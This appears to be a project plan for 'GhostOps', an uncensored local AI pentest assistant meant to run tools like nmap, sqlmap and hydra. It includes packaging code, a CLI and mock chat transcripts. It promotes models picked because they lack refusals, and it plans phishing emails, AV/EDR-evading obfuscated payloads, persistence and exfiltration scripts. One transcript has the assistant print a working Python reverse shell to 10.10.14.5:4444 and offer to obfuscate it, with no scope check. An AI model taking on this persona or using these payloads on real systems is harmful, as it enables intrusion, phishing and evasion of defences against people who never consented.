# ☠️ GhostOps — Local AI Red Team Assistant (Personal Power Tool)

> **Not a mini project** — this is your **personal offensive security co-pilot**, fully local, uncensored, and designed to be genuinely useful in real engagements.

---

## The One-Liner

> A **fully local, uncensored AI red team assistant** that can **execute security tools** (nmap, sqlmap, hydra), **remember engagement context**, **generate exploits & payloads**, and **guide you through the entire pentest kill chain** — all running on YOUR machine with zero cloud dependency.

---

## 1. What Has Already Been Done (Existing Landscape)

### 1.1 AI Pentest Assistants

| Tool | What It Does | Key Limitation |
|---|---|---|
| **[PentestGPT](https://github.com/GreyDGL/PentestGPT)** | LLM-assisted pentesting with tripartite design (reasoning, generation, parsing) | **Cloud-dependent** (needs OpenAI API), no tool execution, just suggests — you still do everything manually |
| **[HackerGPT](https://hackergpt.app/)** | AI assistant for OSINT, CTFs, bug bounty | **Cloud SaaS**, limited free tier, no local mode, can't execute tools |
| **[PentAGI](https://github.com/vxcontrol/pentagi)** | Multi-agent autonomous pentesting system with Docker/Kali sandbox | **Requires cloud LLM API keys** (OpenAI/Anthropic), heavy Docker setup, complex multi-agent overhead |
| **[WhiteRabbitNeo](https://github.com/WhiteRabbitNeo)** | Cybersecurity-specific uncensored LLM (fine-tuned on security data) | **Just a model** — no tool integration, no workflow, no memory. You need to build everything around it |
| **Dolphin / Abliterated Models** | Uncensored versions of Llama/Qwen/Mistral | Same as above — raw models with no tooling, no agent framework, no pentest workflow |

### 1.2 Agentic Frameworks (General Purpose)

| Framework | What It Does | Limitation for Pentesting |
|---|---|---|
| **LangChain / LangGraph** | General-purpose LLM agent framework with tool calling | Not security-focused — you build everything from scratch |
| **AutoGen** (Microsoft) | Multi-agent conversation framework | Overkill for personal tool, complex setup |
| **CrewAI** | Role-based multi-agent orchestration | General purpose, no security tool integrations built-in |

### 1.3 Academic Research

| Paper / System | Year | Innovation |
|---|---|---|
| **PentestGPT** (USENIX 2024) | 2024 | Tripartite architecture: reasoning + generation + parsing modules for pentest guidance |
| **APT-Agent** | 2024 | Hybrid rectification module to fix LLM hallucinations during autonomous exploitation |
| **AutoAttacker** | 2024 | LLM-based automated exploitation with tool chaining |
| **ReaperAI** | 2025 | Autonomous red team agent with MITRE ATT&CK-aligned multi-phase attack planning |
| **Cybench** | 2024 | Benchmark for evaluating LLM agents on real CTF challenges — tests actual hacking ability |

---

## 2. The GAP — What Nobody Has Done

### 2.1 Core Gaps

```
┌─────────────────────────────────────────────────────────────────────────┐
│                     6 CRITICAL GAPS IN EXISTING TOOLS                  │
├──────────────────────────────┬──────────────────────────────────────────┤
│ 1. Cloud Dependency          │ PentestGPT & HackerGPT need OpenAI     │
│                              │ API — leaks target info to cloud       │
│                              │ MASSIVE OPSEC failure                   │
├──────────────────────────────┼──────────────────────────────────────────┤
│ 2. No Tool Execution         │ Most tools just SUGGEST commands —     │
│                              │ you still copy-paste & run manually    │
├──────────────────────────────┼──────────────────────────────────────────┤
│ 3. No Engagement Memory      │ Every conversation starts from zero   │
│                              │ — tool forgets what you found earlier  │
├──────────────────────────────┼──────────────────────────────────────────┤
│ 4. No Workflow Structure     │ No pentest methodology — just random  │
│                              │ Q&A with no kill chain guidance        │
├──────────────────────────────┼──────────────────────────────────────────┤
│ 5. Hallucinations            │ LLMs fabricate non-existent CVEs,     │
│                              │ wrong exploit syntax, fake tool flags  │
├──────────────────────────────┼──────────────────────────────────────────┤
│ 6. No OPSEC Awareness        │ Tools don't warn about noisy scans,   │
│                              │ don't suggest evasion, don't track     │
│                              │ what you've already touched            │
└──────────────────────────────┴──────────────────────────────────────────┘
```

### 2.2 What Makes GhostOps Different

> [!IMPORTANT]
> **Our core innovation**: Not just a chatbot — a **real agentic pentest co-pilot** that executes tools, remembers context, follows methodology, and runs 100% locally for OPSEC.

#### Innovation 1: 🔧 Agentic Tool Execution (Not Just Suggestions)
- **What exists**: PentestGPT says "run `nmap -sV target`". You copy-paste it.
- **What we do**: You say "scan the target" → GhostOps **actually runs nmap**, parses the output, identifies services, suggests next steps, and can auto-launch follow-up tools.
- Supported tools: `nmap`, `gobuster`, `sqlmap`, `hydra`, `nikto`, `ffuf`, `curl`, `whois`, `dig`, `searchsploit`, `msfconsole`, `john`

#### Innovation 2: 🧠 Persistent Engagement Memory
- **What exists**: Every chat session starts blank. You re-explain everything.
- **What we do**: **RAG-powered engagement memory** that remembers:
  - Target scope & IPs discovered
  - Open ports & services found
  - Credentials discovered
  - Vulnerabilities identified
  - Exploitation attempts & results
  - Loot collected
- Ask "what do we know about the target?" at any point → full context dump

#### Innovation 3: 📋 Structured Pentest Methodology Guidance
- **What exists**: Random Q&A with no structure.
- **What we do**: Built-in **pentest kill chain** workflow:
  1. **Reconnaissance** → passive OSINT, DNS, WHOIS
  2. **Scanning** → port scan, service enum, vuln scan
  3. **Enumeration** → directory busting, user enum, share enum
  4. **Exploitation** → exploit selection, payload generation, execution
  5. **Post-Exploitation** → privilege escalation, lateral movement, persistence
  6. **Reporting** → auto-generate pentest report from engagement data
- GhostOps tracks which phase you're in and suggests appropriate next steps

#### Innovation 4: 💀 Exploit & Payload Generation (Uncensored)
- **What exists**: ChatGPT refuses. Cloud tools self-censor.
- **What we do**: Local uncensored model that can:
  - Generate reverse shells in any language (Python, Bash, PowerShell, PHP, etc.)
  - Write custom exploit scripts for known CVEs
  - Craft phishing emails & pretexts for social engineering
  - Generate obfuscated payloads to bypass AV/EDR
  - Write post-exploitation scripts (privesc, persistence, data exfil)
  - Explain and modify existing exploits from ExploitDB

#### Innovation 5: 🛡️ 100% Local / OPSEC-Safe
- **What exists**: PentestGPT sends your target IPs and vuln data to OpenAI's servers.
- **What we do**: **Everything runs locally**:
  - Ollama + uncensored model (no API keys, no cloud)
  - Engagement data never leaves your machine
  - No telemetry, no logging to third parties
  - Air-gap friendly — works completely offline

---

## 3. Architecture

```
┌────────────────────────────────────────────────────────────────────────────┐
│                            GhostOps                                       │
│                                                                            │
│  ┌────────────────┐                                                        │
│  │   Terminal UI   │   (Rich CLI with panels, tables, syntax highlighting) │
│  │   (Chat Mode)   │                                                       │
│  └───────┬────────┘                                                        │
│          │                                                                  │
│  ┌───────▼──────────────────────────────────────────────────────────────┐  │
│  │                      Agent Orchestrator                              │  │
│  │                                                                      │  │
│  │  ┌──────────────┐  ┌──────────────┐  ┌────────────────────────────┐ │  │
│  │  │ Phase Tracker │  │ Intent Parser│  │ Tool Router                │ │  │
│  │  │ (Kill Chain)  │  │ (What does   │  │ (Which tool to execute?)   │ │  │
│  │  │              │  │  user want?) │  │                            │ │  │
│  │  └──────────────┘  └──────────────┘  └────────────┬───────────────┘ │  │
│  └───────────────────────────────────────────────────┼─────────────────┘  │
│                                                       │                    │
│  ┌────────────────────────────────────────────────────┼──────────────────┐│
│  │                    Tool Execution Layer             │                  ││
│  │  ┌─────────┐ ┌──────────┐ ┌─────────┐ ┌──────────▼───┐ ┌─────────┐ ││
│  │  │  nmap    │ │ gobuster │ │ sqlmap  │ │   hydra      │ │  ffuf   │ ││
│  │  └─────────┘ └──────────┘ └─────────┘ └──────────────┘ └─────────┘ ││
│  │  ┌─────────┐ ┌──────────┐ ┌─────────┐ ┌──────────────┐ ┌─────────┐ ││
│  │  │  nikto  │ │  curl    │ │  dig    │ │searchsploit  │ │  john   │ ││
│  │  └─────────┘ └──────────┘ └─────────┘ └──────────────┘ └─────────┘ ││
│  └──────────────────────────────────────────────────────────────────────┘│
│                                                                          │
│  ┌───────────────┐  ┌────────────────────────────────────────────────┐   │
│  │    Ollama      │  │           Knowledge Layer                     │   │
│  │  ┌───────────┐ │  │                                                │   │
│  │  │ Mistral/  │ │  │  ┌──────────────┐  ┌─────────────────────┐   │   │
│  │  │ Dolphin/  │◄├──│  │ 🧠 Engagement │  │ 📚 Security KB      │   │   │
│  │  │ WRN       │ │  │  │   Memory     │  │  (MITRE, CVEs,      │   │   │
│  │  └───────────┘ │  │  │  (ChromaDB)  │  │   Payloads, TTPs)   │   │   │
│  └───────────────┘  │  └──────────────┘  └─────────────────────┘   │   │
│                      └────────────────────────────────────────────────┘   │
│                                                                          │
│  ┌──────────────────────────────────────────────────────────────────┐    │
│  │                    Report Generator                               │    │
│  │          (Markdown pentest report from engagement data)           │    │
│  └──────────────────────────────────────────────────────────────────┘    │
└──────────────────────────────────────────────────────────────────────────┘
```

---

## 4. Tech Stack

| Layer | Technology | Why |
|---|---|---|
| **Language** | Python 3.11+ | Security tool ecosystem |
| **LLM Runtime** | Ollama | Easy local model management |
| **LLM Model** | Dolphin-Mistral 7B / WhiteRabbitNeo 7B / Qwen2.5-7B-abliterated | Uncensored, security-capable, runs on 8GB VRAM |
| **Agent Framework** | Custom (lightweight) OR LangChain | Tool calling, output parsing, chain-of-thought |
| **Vector DB** | ChromaDB | Engagement memory (RAG) — lightweight, embedded |
| **Embeddings** | `nomic-embed-text` (via Ollama) | Local embeddings for RAG, no cloud |
| **CLI Interface** | `rich` + `prompt_toolkit` | Beautiful terminal UI with panels, tables, syntax highlighting |
| **Tool Execution** | `subprocess` + output parsers | Run nmap/sqlmap/etc and parse results |
| **Reporting** | Jinja2 + Markdown | Auto-generate pentest reports |
| **Config** | YAML | Engagement config, tool paths, model selection |

---

## 5. Project Structure — Kali Linux Native Tool

> Packaged as a proper **installable Kali Linux tool** — runs from anywhere with `ghostops` command.

```
ghostops/
├── pyproject.toml                    # 📦 Package config — makes it pip installable
├── setup.cfg                         # Package metadata
├── install.sh                        # 🔧 One-command Kali installer
├── Makefile                          # make install / make uninstall
├── README.md
│
├── ghostops/                         # Python package (importable)
│   ├── __init__.py                   # Package init + version
│   ├── __main__.py                   # python -m ghostops support
│   ├── cli.py                        # 🖥️ Typer CLI — global 'ghostops' command
│   ├── config.py                     # Config loader (YAML)
│   ├── setup_wizard.py               # 🧙 First-run setup (check tools, pull model)
│   │
│   ├── agent/                        # Core agent logic
│   │   ├── __init__.py
│   │   ├── orchestrator.py           # Main agent loop — intent → tool → response
│   │   ├── intent_parser.py          # Classify user intent (scan, exploit, enumerate, etc.)
│   │   ├── phase_tracker.py          # 📋 Kill chain phase management
│   │   └── tool_router.py            # Route intent to appropriate tool
│   │
│   ├── tools/                        # Tool integration wrappers
│   │   ├── __init__.py
│   │   ├── base_tool.py              # Base class for all tool wrappers
│   │   ├── nmap_tool.py              # Nmap wrapper + output parser
│   │   ├── gobuster_tool.py          # Gobuster/ffuf wrapper
│   │   ├── sqlmap_tool.py            # SQLMap wrapper
│   │   ├── hydra_tool.py             # Hydra brute-force wrapper
│   │   ├── searchsploit_tool.py      # ExploitDB search wrapper
│   │   ├── nikto_tool.py             # Nikto web scanner wrapper
│   │   └── shell_tool.py             # Generic shell command executor
│   │
│   ├── ai/                           # LLM integration
│   │   ├── __init__.py
│   │   ├── llm_client.py             # Ollama interface
│   │   ├── prompts.py                # System prompts (red team persona)
│   │   └── output_parser.py          # Parse LLM responses (extract commands, code blocks)
│   │
│   ├── memory/                       # Engagement memory (RAG)
│   │   ├── __init__.py
│   │   ├── engagement_store.py       # 🧠 ChromaDB vector store for context
│   │   ├── findings_tracker.py       # Track hosts, ports, vulns, creds, loot
│   │   └── embeddings.py             # Local embedding model interface
│   │
│   ├── report/
│   │   ├── __init__.py
│   │   ├── generator.py              # Auto-generate pentest report
│   │   └── template.md               # Markdown report template
│   │
│   └── knowledge/                    # Static knowledge base
│       ├── payloads.yaml             # Common reverse shells, webshells, one-liners
│       ├── checklists.yaml           # Pentest checklists per service (SSH, HTTP, SMB, etc.)
│       └── mitre_mapping.yaml        # Command → ATT&CK TTP reference
│
├── tests/                            # Test suite
│   ├── test_tools.py
│   ├── test_agent.py
│   └── test_memory.py
│
└── engagements/                      # Saved engagement data (auto-created)
    └── .gitkeep
```

**Total: ~22 files, ~3500–4000 lines of Python**

---

## 5.1 Kali Linux Packaging Details

### `pyproject.toml` — Makes It Installable

```toml
[build-system]
requires = ["setuptools>=68.0", "wheel"]
build-backend = "setuptools.build_meta"

[project]
name = "ghostops"
version = "1.0.0"
description = "☠️ Local AI Red Team Assistant — Uncensored, Agentic, OPSEC-Safe"
readme = "README.md"
license = {text = "MIT"}
requires-python = ">=3.11"
keywords = ["pentesting", "red-team", "AI", "security", "offensive"]

dependencies = [
    "ollama>=0.4.0",
    "chromadb>=0.5.0",
    "rich>=13.0",
    "typer>=0.12.0",
    "prompt-toolkit>=3.0",
    "pyyaml>=6.0",
    "jinja2>=3.1",
]

[project.scripts]
ghostops = "ghostops.cli:app"       # Creates global 'ghostops' command

[project.urls]
Homepage = "https://github.com/YOUR_USERNAME/ghostops"
```

### `install.sh` — One-Command Kali Installer

```bash
#!/bin/bash
# ☠️ GhostOps Installer for Kali Linux
# Usage: curl -sSL https://raw.githubusercontent.com/YOU/ghostops/main/install.sh | bash

set -e
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; NC='\033[0m'

echo -e "${RED}☠️  GhostOps Installer${NC}"
echo "================================"

# 1. Check we're on a Debian-based system
if ! command -v apt &>/dev/null; then
    echo -e "${RED}Error: apt not found. This installer requires Kali/Debian/Ubuntu.${NC}"
    exit 1
fi

# 2. Install missing security tools
echo -e "\n${YELLOW}[1/4] Checking security tools...${NC}"
TOOLS=("nmap" "gobuster" "sqlmap" "hydra" "nikto" "exploitdb" "john" "ffuf" "curl" "whois" "dnsutils")
MISSING=()
for tool in "${TOOLS[@]}"; do
    dpkg -l "$tool" &>/dev/null 2>&1 || MISSING+=("$tool")
done

if [ ${#MISSING[@]} -gt 0 ]; then
    echo -e "  📦 Installing: ${MISSING[*]}"
    sudo apt update -qq && sudo apt install -y -qq "${MISSING[@]}"
else
    echo -e "  ${GREEN}✅ All security tools present${NC}"
fi

# 3. Install Ollama
echo -e "\n${YELLOW}[2/4] Setting up Ollama...${NC}"
if ! command -v ollama &>/dev/null; then
    echo "  🤖 Installing Ollama..."
    curl -fsSL https://ollama.com/install.sh | sh
    sudo systemctl enable ollama && sudo systemctl start ollama
else
    echo -e "  ${GREEN}✅ Ollama already installed${NC}"
fi

# 4. Pull uncensored model
echo -e "\n${YELLOW}[3/4] Pulling AI model...${NC}"
if ! ollama list 2>/dev/null | grep -q "dolphin-mistral"; then
    echo "  🧠 Downloading dolphin-mistral (4.1GB)..."
    ollama pull dolphin-mistral
    echo "  🧠 Downloading embedding model..."
    ollama pull nomic-embed-text
else
    echo -e "  ${GREEN}✅ Model already downloaded${NC}"
fi

# 5. Install GhostOps
echo -e "\n${YELLOW}[4/4] Installing GhostOps...${NC}"
pip install --break-system-packages ghostops 2>/dev/null || pip install ghostops

echo ""
echo -e "${GREEN}════════════════════════════════════════${NC}"
echo -e "${GREEN}  ☠️  GhostOps installed successfully!  ${NC}"
echo -e "${GREEN}════════════════════════════════════════${NC}"
echo ""
echo "  Quick start:"
echo "    ghostops setup          # Verify installation"
echo "    ghostops engage TARGET  # Start hacking"
echo "    ghostops shell          # Free chat mode"
echo "    ghostops --help         # All commands"
```

### `Makefile` — Developer Shortcuts

```makefile
.PHONY: install uninstall dev clean

install:                              ## Install GhostOps system-wide
	pip install .
	@echo "✅ Run 'ghostops --help' to get started"

dev:                                  ## Install in development mode
	pip install -e ".[dev]"

uninstall:                            ## Remove GhostOps
	pip uninstall ghostops -y

clean:                                ## Clean build artifacts
	rm -rf build/ dist/ *.egg-info
```

### `ghostops/cli.py` — The Global CLI

```python
#!/usr/bin/env python3
"""☠️ GhostOps — Local AI Red Team Assistant"""
import typer
from rich.console import Console
from rich.panel import Panel

app = typer.Typer(
    name="ghostops",
    help="☠️ GhostOps — Local AI Red Team Assistant",
    add_completion=True,
    rich_markup_mode="rich",
)
console = Console()

@app.command()
def engage(
    target: str = typer.Argument(..., help="Target IP or hostname"),
    model: str = typer.Option("dolphin-mistral", help="Ollama model to use"),
    stealth: bool = typer.Option(False, help="Enable OPSEC-safe mode"),
):
    """🎯 Start a new engagement against a target."""
    console.print(Panel(
        f"[bold red]☠️ GhostOps[/bold red]\n"
        f"Target: [cyan]{target}[/cyan]\n"
        f"Model: [green]{model}[/green]\n"
        f"Stealth: {'🟢 ON' if stealth else '🔴 OFF'}",
        title="New Engagement"
    ))
    from ghostops.agent.orchestrator import start_engagement
    start_engagement(target, model, stealth)

@app.command()
def shell(
    model: str = typer.Option("dolphin-mistral", help="Ollama model"),
):
    """💬 Open free-form chat with the red team AI."""
    from ghostops.agent.orchestrator import start_shell
    start_shell(model)

@app.command()
def resume(
    engagement_id: str = typer.Argument("last", help="Engagement ID or 'last'"),
):
    """🔄 Resume a previous engagement."""
    from ghostops.agent.orchestrator import resume_engagement
    resume_engagement(engagement_id)

@app.command()
def generate(
    payload_type: str = typer.Argument(..., help="revshell|webshell|privesc|phish"),
    lhost: str = typer.Option(..., "--lhost", "-l", help="Listener IP"),
    lport: int = typer.Option(4444, "--lport", "-p", help="Listener port"),
    lang: str = typer.Option("python", help="Language: python|bash|php|powershell|java"),
    obfuscate: bool = typer.Option(False, help="Obfuscate the payload"),
):
    """💀 Generate payloads (reverse shells, webshells, etc.)."""
    from ghostops.ai.payload_gen import generate_payload
    generate_payload(payload_type, lhost, lport, lang, obfuscate)

@app.command()
def report(
    engagement_id: str = typer.Argument("last", help="Engagement ID or 'last'"),
    output: str = typer.Option("report.md", "-o", help="Output file path"),
):
    """📝 Generate a pentest report from engagement data."""
    from ghostops.report.generator import generate_report
    generate_report(engagement_id, output)

@app.command()
def setup():
    """🧙 First-run setup — check tools, pull models, verify config."""
    from ghostops.setup_wizard import run_setup
    run_setup()

@app.command()
def engagements():
    """📋 List all saved engagements."""
    from ghostops.memory.engagement_store import list_engagements
    list_engagements()

if __name__ == "__main__":
    app()
```

### `ghostops/setup_wizard.py` — First-Run Setup

```python
"""🧙 First-run setup wizard — checks everything is ready."""
from rich.console import Console
from rich.table import Table
import subprocess, shutil

console = Console()

REQUIRED_TOOLS = {
    "nmap":          "Network scanner",
    "gobuster":      "Directory brute-forcer",
    "sqlmap":        "SQL injection tool",
    "hydra":         "Brute-force tool",
    "nikto":         "Web vulnerability scanner",
    "searchsploit":  "ExploitDB search",
    "john":          "Password cracker",
    "ffuf":          "Web fuzzer",
    "curl":          "HTTP client",
    "ollama":        "Local LLM runtime",
}

def run_setup():
    console.print("[bold red]☠️ GhostOps Setup Wizard[/bold red]\n")
    
    # Check tools
    table = Table(title="🔧 Tool Check")
    table.add_column("Tool", style="cyan")
    table.add_column("Purpose")
    table.add_column("Status")
    
    missing = []
    for tool, desc in REQUIRED_TOOLS.items():
        found = shutil.which(tool) is not None
        status = "[green]✅ Found[/green]" if found else "[red]❌ Missing[/red]"
        table.add_row(tool, desc, status)
        if not found: missing.append(tool)
    
    console.print(table)
    
    if missing:
        console.print(f"\n[yellow]Install missing tools:[/yellow]")
        console.print(f"  sudo apt install {' '.join(missing)}")
    
    # Check Ollama model
    console.print("\n[bold]🧠 Model Check[/bold]")
    try:
        result = subprocess.run(["ollama", "list"], capture_output=True, text=True)
        if "dolphin-mistral" in result.stdout:
            console.print("  [green]✅ dolphin-mistral ready[/green]")
        else:
            console.print("  [yellow]⚠️ Run: ollama pull dolphin-mistral[/yellow]")
    except FileNotFoundError:
        console.print("  [red]❌ Ollama not installed[/red]")
    
    console.print("\n[green]Setup complete! Run:[/green] ghostops engage TARGET")
```

### Usage After Installation

```bash
# ══════════════════════════════════════════════════
# INSTALLATION (choose one)
# ══════════════════════════════════════════════════

# Option 1: One-line installer (recommended for Kali)
curl -sSL https://raw.githubusercontent.com/YOU/ghostops/main/install.sh | bash

# Option 2: From PyPI
pip install ghostops

# Option 3: From source
git clone https://github.com/YOU/ghostops.git
cd ghostops && make install

# ══════════════════════════════════════════════════
# USAGE — works from ANYWHERE in terminal
# ══════════════════════════════════════════════════

ghostops --help                                    # Show all commands
ghostops setup                                     # First-run wizard
ghostops engage 10.10.10.100                       # Start engagement
ghostops engage 10.10.10.100 --stealth             # OPSEC mode
ghostops shell                                     # Free chat
ghostops shell --model whiterabbitneo               # Use different model
ghostops generate revshell -l 10.10.14.5 -p 4444   # Quick reverse shell
ghostops generate webshell --lang php               # PHP webshell
ghostops resume last                                # Resume last engagement
ghostops engagements                                # List all engagements
ghostops report last -o pentest_report.md           # Generate report
```

---

## 6. Feature Breakdown

### ✅ Core Features

| Feature | What It Does |
|---|---|
| **💬 Chat Interface** | Rich terminal UI — ask questions, give commands, get guidance |
| **🔧 Tool Execution** | Run nmap, gobuster, sqlmap, hydra, nikto directly from chat |
| **📊 Output Parsing** | Auto-parse tool outputs into structured findings (hosts, ports, vulns) |
| **🧠 Engagement Memory** | RAG-powered context — remembers everything discovered |
| **📋 Kill Chain Tracker** | Tracks recon → scan → enum → exploit → post-exploit phases |
| **💀 Payload Generator** | Reverse shells, webshells, privesc scripts in any language |
| **🔍 Exploit Finder** | Search ExploitDB, suggest exploits for discovered services/versions |
| **📝 Auto-Reporting** | Generate markdown pentest report from engagement data |
| **🛡️ OPSEC Mode** | Warn about noisy techniques, suggest stealthy alternatives |
| **📚 Knowledge Base** | Built-in checklists, payloads, methodology per service type |

### Tool Integrations

| Tool | What GhostOps Does With It |
|---|---|
| **nmap** | Port scan, service detection, OS fingerprinting → auto-parse results |
| **gobuster / ffuf** | Directory bruteforcing → find hidden paths |
| **sqlmap** | Auto SQL injection testing on discovered URLs |
| **hydra** | Brute-force SSH, FTP, HTTP login pages |
| **nikto** | Web server vulnerability scanning |
| **searchsploit** | Find exploits for discovered service versions |
| **curl** | Manual HTTP requests, API testing |
| **dig / whois** | DNS recon, domain info |
| **john** | Crack password hashes found during engagement |
| **msfconsole** | Metasploit framework integration (stretch goal) |

---

## 7. How It Works — Example Conversations

### Example 1: Starting an Engagement

```
┌─ GhostOps ─────────────────────────────────────────────────────────┐
│                                                                     │
│  You: Start a new engagement against 10.10.10.100                  │
│                                                                     │
│  GhostOps: 🎯 New engagement started.                             │
│  ┌─────────────────────────────────────────┐                       │
│  │ Target:    10.10.10.100                 │                       │
│  │ Phase:     RECONNAISSANCE               │                       │
│  │ Findings:  0 hosts | 0 ports | 0 vulns  │                       │
│  └─────────────────────────────────────────┘                       │
│                                                                     │
│  I'll start with reconnaissance. Want me to:                       │
│  1. Run a quick nmap scan (top 1000 ports)                         │
│  2. Run a full nmap scan (all ports, slower)                       │
│  3. Do passive recon first (DNS, WHOIS)                            │
│                                                                     │
│  You: 1                                                            │
│                                                                     │
│  GhostOps: 🔧 Executing: nmap -sC -sV -oA scan1 10.10.10.100     │
│  ⏳ Running... (this may take a minute)                            │
│                                                                     │
│  ✅ Scan complete. Found 4 open ports:                              │
│  ┌──────┬─────────┬──────────────────────────────┐                 │
│  │ Port │ Service │ Version                       │                 │
│  ├──────┼─────────┼──────────────────────────────┤                 │
│  │ 22   │ SSH     │ OpenSSH 8.2p1 Ubuntu          │                 │
│  │ 80   │ HTTP    │ Apache 2.4.41                 │                 │
│  │ 443  │ HTTPS   │ Apache 2.4.41                 │                 │
│  │ 3306 │ MySQL   │ MySQL 5.7.38                  │                 │
│  └──────┴─────────┴──────────────────────────────┘                 │
│                                                                     │
│  📋 Phase updated: SCANNING → ENUMERATION                         │
│  🧠 Saved to engagement memory.                                   │
│                                                                     │
│  Recommended next steps:                                           │
│  • HTTP: Run gobuster for directory enumeration                    │
│  • MySQL: Check for default/weak credentials                       │
│  • SSH: Check for known CVEs in OpenSSH 8.2p1                     │
│  • All: Run searchsploit for version-specific exploits             │
│                                                                     │
│  What would you like to do?                                        │
└─────────────────────────────────────────────────────────────────────┘
```

### Example 2: Exploit Generation

```
You: Generate a Python reverse shell for 10.10.14.5:4444

GhostOps: 💀 Here's your Python reverse shell:

  ┌──────────────────────────────────────────────────────┐
  │ import socket,subprocess,os                          │
  │ s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)  │
  │ s.connect(("10.10.14.5",4444))                      │
  │ os.dup2(s.fileno(),0)                                │
  │ os.dup2(s.fileno(),1)                                │
  │ os.dup2(s.fileno(),2)                                │
  │ subprocess.call(["/bin/sh","-i"])                    │
  │                                                      │
  │ # Base64 encoded one-liner:                          │
  │ python3 -c 'import base64;exec(base64.b64decode...)' │
  └──────────────────────────────────────────────────────┘

  ⚠️ OPSEC Note: Raw Python reverse shells are easily 
  detected by EDR. Want me to generate an obfuscated version?
```

### Example 3: Context Recall

```
You: What do we know about the target so far?

GhostOps: 🧠 Engagement Summary for 10.10.10.100:

  Phase: EXPLOITATION
  Duration: 2h 15m

  ┌─ Discovered Services ──────────────────────────┐
  │ 22/SSH    - OpenSSH 8.2p1 (no weak creds)      │
  │ 80/HTTP   - Apache 2.4.41 + WordPress 5.8.1    │
  │ 443/HTTPS - Same as 80, with valid SSL cert     │
  │ 3306/MySQL - MySQL 5.7.38 (remote access open) │
  └────────────────────────────────────────────────┘

  ┌─ Findings ─────────────────────────────────────┐
  │ 🔴 HIGH: WordPress plugin vuln (CVE-2021-XXXXX)│
  │ 🟡 MED:  MySQL remote access with weak creds   │
  │ 🟡 MED:  Directory listing enabled on /uploads │
  │ 🟢 LOW:  Missing security headers              │
  └────────────────────────────────────────────────┘

  ┌─ Credentials Found ────────────────────────────┐
  │ MySQL: root / toor (hydra brute-force)          │
  │ WordPress: admin / admin123 (wp-login)          │
  └────────────────────────────────────────────────┘

  Suggested next: Exploit WordPress CVE for shell access.
```

---

## 8. Uncensored Model Selection Guide

| Model | Size | VRAM Needed | Best For | Ollama Command |
|---|---|---|---|---|
| **Dolphin-Mistral 7B** | 4.1GB | 6GB | General + coding, fast | `ollama pull dolphin-mistral` |
| **Dolphin-Llama3 8B** | 4.7GB | 8GB | Better reasoning, good coding | `ollama pull dolphin-llama3` |
| **WhiteRabbitNeo 7B** | 4.1GB | 6GB | Security-specific knowledge | `ollama pull whiterabbitneo` |
| **Qwen2.5-Coder-7B-abliterated** | 4.4GB | 8GB | Best for code/exploit gen | Custom GGUF via Ollama |
| **Dolphin-Mixtral 8x7B** | 26GB | 24GB+ | Maximum capability (if you have the GPU) | `ollama pull dolphin-mixtral` |

> [!TIP]
> **Start with `dolphin-mistral` (7B)**. It's fast, uncensored, and runs on 6GB VRAM. Upgrade to Dolphin-Llama3 or Qwen2.5-Coder if you want better exploit generation. WhiteRabbitNeo is best if you want pre-loaded security knowledge.

---

## 9. 6-Week Build Plan

### Week 1: Foundation — CLI + LLM Chat
- [ ] Set up project structure & dependencies
- [ ] Install Ollama + pull `dolphin-mistral`
- [ ] Build LLM client (`llm_client.py`) — chat interface to Ollama
- [ ] Build Rich CLI interface — styled terminal chat with panels
- [ ] Design system prompt (red team persona, uncensored, methodology-aware)
- [ ] Basic Q&A working: ask security questions, get uncensored answers

**Deliverable**: Working CLI chat with an uncensored security AI.

---

### Week 2: Tool Execution Layer ⭐
- [ ] Build base tool wrapper class
- [ ] Nmap wrapper — run scan, parse XML/text output into structured data
- [ ] Gobuster wrapper — directory brute-force, parse results
- [ ] SQLMap wrapper — auto SQL injection, parse findings
- [ ] Hydra wrapper — brute-force, parse cracked creds
- [ ] Searchsploit wrapper — search ExploitDB for versions
- [ ] Tool router — LLM decides which tool to run based on context
- [ ] Generic shell executor (for arbitrary commands with user confirmation)

**Deliverable**: "Scan the target" → actually runs nmap & parses results.

---

### Week 3: Engagement Memory (RAG) ⭐
- [ ] Set up ChromaDB for vector storage
- [ ] Set up local embeddings (`nomic-embed-text` via Ollama)
- [ ] Build engagement store — save/retrieve findings, scans, creds
- [ ] Build findings tracker — structured storage for hosts, ports, vulns, creds
- [ ] RAG retrieval — inject relevant context into every LLM prompt
- [ ] "What do we know?" command — dump full engagement context
- [ ] Persistence — save/load engagement state across sessions

**Deliverable**: AI remembers everything from the engagement across sessions.

---

### Week 4: Kill Chain & Methodology
- [ ] Build phase tracker (Recon → Scan → Enum → Exploit → Post-Exploit)
- [ ] Service-specific checklists (HTTP checklist, SSH checklist, SMB checklist, etc.)
- [ ] Auto-suggest next steps based on current phase + findings
- [ ] OPSEC warnings — flag noisy techniques, suggest stealthy alternatives
- [ ] Payload knowledge base — reverse shells, webshells, privesc commands
- [ ] MITRE ATT&CK mapping for actions taken

**Deliverable**: Guided methodology — AI knows where you are in the engagement.

---

### Week 5: Exploit & Payload Generation ⭐
- [ ] Reverse shell generator (Python, Bash, PowerShell, PHP, Java, Node.js)
- [ ] Webshell generator (PHP, ASPX, JSP)
- [ ] Payload obfuscation (base64, variable substitution, string splitting)
- [ ] Custom exploit script generation from CVE descriptions
- [ ] Phishing email / pretext generator
- [ ] Post-exploitation script generation (privesc, persistence, exfil)
- [ ] ExploitDB integration — search + explain + modify exploits

**Deliverable**: Full offensive code generation capability.

---

### Week 6: Reporting + Polish
- [ ] Auto-generate markdown pentest report from engagement data:
  - Executive summary
  - Scope & methodology
  - Findings with severity ratings
  - Evidence (scan outputs, screenshots references)
  - Remediation recommendations
- [ ] Engagement export/import (save & resume engagements)
- [ ] Help system & command reference
- [ ] Error handling & edge cases
- [ ] README with installation guide
- [ ] Demo recording

**Deliverable**: Complete, personal-use red team assistant.

---

## 10. Comparison Matrix

| Feature | PentestGPT | HackerGPT | PentAGI | WhiteRabbitNeo | **GhostOps (Ours)** |
|---|:---:|:---:|:---:|:---:|:---:|
| Local / Offline | ❌ (OpenAI) | ❌ (Cloud) | ❌ (API keys) | ✅ (model only) | ✅ ⭐ |
| Uncensored | ❌ | Partial | ❌ | ✅ | ✅ ⭐ |
| Tool Execution | ❌ | ❌ | ✅ (Docker) | ❌ | ✅ ⭐ |
| Output Parsing | ❌ | ❌ | ✅ | ❌ | ✅ |
| Engagement Memory | ❌ | ❌ | Partial | ❌ | ✅ ⭐ (RAG) |
| Kill Chain Tracking | Partial | ❌ | ❌ | ❌ | ✅ ⭐ |
